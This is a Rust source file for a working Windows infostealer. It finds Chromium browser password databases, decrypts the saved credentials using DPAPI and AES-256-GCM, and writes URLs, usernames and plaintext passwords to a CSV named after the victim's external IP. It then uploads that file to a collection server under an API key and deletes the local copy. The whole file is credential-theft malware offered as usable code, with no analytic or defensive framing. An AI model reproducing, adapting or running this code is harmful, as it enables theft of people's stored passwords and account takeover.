use std::env;
use std::path::PathBuf;
use std::fs;
use walkdir::WalkDir;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use serde_json::from_str;
use tempdir::TempDir;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use sqlite::State;
use csv;
use reqwest;
use chrono;
use std::error::Error;
use std::fs::File;
use std::path::Path;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use std::io::Read;

struct ChromiumBrowser { 
    name: String, 
    local_state_path: PathBuf, 
    login_data_path: PathBuf 
}

const SERVER_URL: &str = "http://127.0.0.1:8000/upload";
const API_KEY: &str = "S3cUr3K3y!@#456"; //Must match with server

fn main() {
    let browsers = detect_chromium_browsers();
    if browsers.is_empty() { 
        println!("Null ok browsers.");
        return; 
    }

    let mut all_passwords = Vec::new();

    for browser in browsers {
        if let Ok(master_key) = get_master_key(&browser.local_state_path) {
            if let Ok(passwords) = get_passwords(&browser.login_data_path, &master_key) {
                if !passwords.is_empty() {
                    all_passwords.extend(passwords);
                }
            }
        }
    }

    if !all_passwords.is_empty() {
        if let Err(e) = upload_passwords(all_passwords) {
            eprintln!("Fail {}", e);
        } else {
            println!("Succ.");
        }
    } else {
        println!("Null.");
    }
}

fn upload_passwords(passwords: Vec<Vec<String>>) -> Result<(), String> {
    let filename = generate_unique_filename(passwords.len())?;
    write_to_csv(&passwords, &filename)
        .map_err(|e| format!("Failed to write CSV: {}", e))?;
    upload_via_http(&filename)?;
    fs::remove_file(&filename).map_err(|e| format!("Failed to delete CSV file: {}", e))?;
    Ok(())
}

fn generate_unique_filename(total_recovered: usize) -> Result<String, String> {
    let external_ip = get_external_ip()?;
    let date = chrono::Local::now().format("%Y-%m-%d").to_string();
    Ok(format!("[{}]-[{}]-[{}].csv", external_ip, total_recovered, date))
}

fn get_external_ip() -> Result<String, String> {
    let response = reqwest::blocking::get("https://api.ipify.org?format=text")
        .map_err(|e| format!("Failed to get external IP: {}", e))?
        .text()
        .map_err(|e| format!("Failed to read response text: {}", e))?;
    Ok(response.trim().to_string())
}

fn write_to_csv(passwords: &Vec<Vec<String>>, filename: &str) -> Result<(), Box<dyn Error>> {
    let file_path = Path::new(&filename);
    let mut wtr = csv::Writer::from_path(file_path)?;
    wtr.write_record(&["URL", "Username", "Password"])?;
    for record in passwords {
        wtr.write_record(record)?;
    }
    wtr.flush()?;
    Ok(())
}

fn upload_via_http(filename: &str) -> Result<(), String> {
    let file_path = Path::new(filename);
    let mut file = File::open(file_path)
        .map_err(|e| format!("Failed to open file for upload: {}", e))?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .map_err(|e| format!("Failed to read file for upload: {}", e))?;
    let form = reqwest::blocking::multipart::Form::new()
        .part("file", reqwest::blocking::multipart::Part::bytes(buffer)
            .file_name(filename.to_string())
            .mime_str("text/csv")
            .map_err(|e| format!("Failed to set MIME type: {}", e))?);
    let client = reqwest::blocking::Client::new();
    let response = client.post(SERVER_URL)
        .header("api-key", API_KEY)
        .multipart(form)
        .send()
        .map_err(|e| format!("Failed to send POST request: {}", e))?;
    if response.status().is_success() {
        Ok(())
    } else {
        Err(format!("Server responded with status: {}", response.status()))
    }
}

fn detect_chromium_browsers() -> Vec<ChromiumBrowser> {
    let app_dirs = get_app_dirs();
    scan_for_login_data(&app_dirs)
}

fn get_app_dirs() -> Vec<PathBuf> {
    let local_app_data = match env::var("LOCALAPPDATA") { 
        Ok(val) => PathBuf::from(val), 
        Err(_) => PathBuf::new() 
    };
    let app_data = match env::var("APPDATA") { 
        Ok(val) => PathBuf::from(val), 
        Err(_) => PathBuf::new() 
    };
    vec![local_app_data, app_data]
}

fn scan_for_login_data(app_dirs: &[PathBuf]) -> Vec<ChromiumBrowser> {
    let mut browsers = Vec::new();
    for dir in app_dirs {
        if dir.as_os_str().is_empty() || !dir.exists() { continue; }
        for entry in WalkDir::new(dir)
            .max_depth(6)
            .follow_links(false)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file() && e.file_name() == "Login Data") 
        {
            let login_data_path = entry.path().to_path_buf();
            let local_state_path = match entry.path().parent() {
                Some(p) => p.parent().unwrap_or(p).join("Local State"),
                None => continue,
            };
            if !local_state_path.exists() { continue; }
            let browser_name = infer_browser_name(&login_data_path);
            if validate_login_data_schema(&login_data_path) {
                browsers.push(ChromiumBrowser { 
                    name: browser_name, 
                    local_state_path, 
                    login_data_path 
                });
            }
        }
    }
    browsers
}

fn validate_login_data_schema(login_data_path: &PathBuf) -> bool {
    let conn = match sqlite::open(login_data_path) { 
        Ok(c) => c, 
        Err(_) => return false 
    };
    let mut statement = match conn.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='logins';") { 
        Ok(s) => s, 
        Err(_) => return false 
    };
    matches!(statement.next(), Ok(State::Row))
}

fn infer_browser_name(login_data_path: &PathBuf) -> String {
    let user_data_dir = login_data_path.parent().and_then(|p| p.parent());
    if let Some(user_data) = user_data_dir {
        if let Some(browser_dir) = user_data.parent() {
            if let Some(browser_name) = browser_dir.file_name() {
                return browser_name.to_string_lossy().into_owned();
            }
        }
    }
    "Unknown Chromium Browser".to_string()
}

fn get_master_key(local_state_path: &PathBuf) -> Result<Vec<u8>, String> {
    let tmp_dir = TempDir::new("chromium_master_key").map_err(|e| e.to_string())?;
    let tmp_local_state_path = tmp_dir.path().join("Local State");
    fs::copy(local_state_path, &tmp_local_state_path)
        .map_err(|e| format!("Copy LS file failed!: {}", e))?;
    let content = fs::read_to_string(&tmp_local_state_path)
        .map_err(|e| format!("Read LS file failed!: {}", e))?;
    tmp_dir.close().map_err(|e| format!("Failed to delete temporary directory: {}", e))?;
    let json: serde_json::Value = from_str(&content)
        .map_err(|e| format!("JSON parsing failed!: {}", e))?;
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or("Encrypted key not found.")?;
    let mut encrypted_key = STANDARD.decode(encrypted_key_b64)
        .map_err(|e| format!("Base64 decode of key failed!: {}", e))?;
    if encrypted_key.len() < 5 { 
        return Err("Encrypted key too short.".to_string()); 
    }
    encrypted_key = encrypted_key[5..].to_vec(); // Remove 'DPAPI' prefix
    decrypt_encrypted_key(encrypted_key).ok_or("Master key decryption failed!".to_string())
}

fn decrypt_encrypted_key(encrypted_key: Vec<u8>) -> Option<Vec<u8>> {
    win32_crypt_unprotect_data(encrypted_key).ok()
}

fn get_passwords(login_data_path: &PathBuf, key: &[u8]) -> Result<Vec<Vec<String>>, String> {
    let tmp_dir = TempDir::new("chromium_login_data").map_err(|e| e.to_string())?;
    let tmp_login_data_path = tmp_dir.path().join("Login Data");
    fs::copy(login_data_path, &tmp_login_data_path)
        .map_err(|e| format!("Login Data file copying failed!: {}", e))?;
    let logins = {
        let conn = sqlite::open(&tmp_login_data_path)
            .map_err(|e| format!("SQL DB open failed!: {}", e))?;
        let mut statement = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
            .map_err(|e| format!("SQL statement initialization failed!: {}", e))?;
        let mut logins = Vec::new();
        while let State::Row = statement.next()
            .map_err(|e| format!("SQL query execution failed!: {}", e))? 
        {
            let url: String = statement.read(0)
                .map_err(|e| format!("Failed to read URL: {}", e))?;
            let username: String = statement.read(1)
                .map_err(|e| format!("Failed to read username: {}", e))?;
            let encrypted_password: Vec<u8> = statement.read(2)
                .map_err(|e| format!("Failed to read password: {}", e))?;
            let decrypted_password = decrypt_password(key, encrypted_password)
                .unwrap_or_else(|_| "".to_string());
            logins.push(vec![url, username, decrypted_password]);
        }
        logins
    };
    tmp_dir.close().map_err(|e| format!("Failed to remove temporary directory: {}", e))?;
    Ok(logins)
}

fn decrypt_password(key: &[u8], encrypted_password: Vec<u8>) -> Result<String, String> {
    let decrypted_data = match aes_256_gcm_decrypt(key, encrypted_password.clone()) {
        Ok(data) => data,
        Err(_) => win32_crypt_unprotect_data(encrypted_password)
            .map_err(|e| format!("DPAPI decryption failed!: {}", e))?
    };
    String::from_utf8(decrypted_data).map_err(|e| format!("UTF-8 error: {:?}", e))
}

fn aes_256_gcm_decrypt(key: &[u8], data: Vec<u8>) -> Result<Vec<u8>, aes_gcm::Error> {
    let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
    if data.len() < 15 { 
        return Err(aes_gcm::Error); 
    }
    let nonce = GenericArray::from_slice(&data[3..15]);
    cipher.decrypt(nonce, data[15..].as_ref())
}

#[cfg(windows)]
fn win32_crypt_unprotect_data(encrypted_data: Vec<u8>) -> Result<Vec<u8>, String> {
    use std::ptr::null_mut;
    let mut in_blob = CRYPTOAPI_BLOB { 
        cbData: encrypted_data.len() as u32, 
        pbData: encrypted_data.as_ptr() as *mut u8 
    };
    let mut out_blob = CRYPTOAPI_BLOB { 
        cbData: 0, 
        pbData: null_mut() 
    };
    unsafe {
        let success = CryptUnprotectData(
            &mut in_blob, 
            null_mut(), 
            null_mut(), 
            null_mut(), 
            null_mut(), 
            0, 
            &mut out_blob
        );
        if success == 0 { 
            return Err("CryptUnprotectData failed!".to_string()); 
        }
        if out_blob.cbData == 0 || out_blob.pbData.is_null() {
            return Err("No data decrypted.".to_string());
        }
        let decrypted = Vec::from_raw_parts(
            out_blob.pbData, 
            out_blob.cbData as usize, 
            out_blob.cbData as usize
        );
        Ok(decrypted)
    }
}

#[cfg(not(windows))]
fn win32_crypt_unprotect_data(_encrypted_data: Vec<u8>) -> Result<Vec<u8>, String> {
    Err("DPAPI is Windows only!".to_string())
}
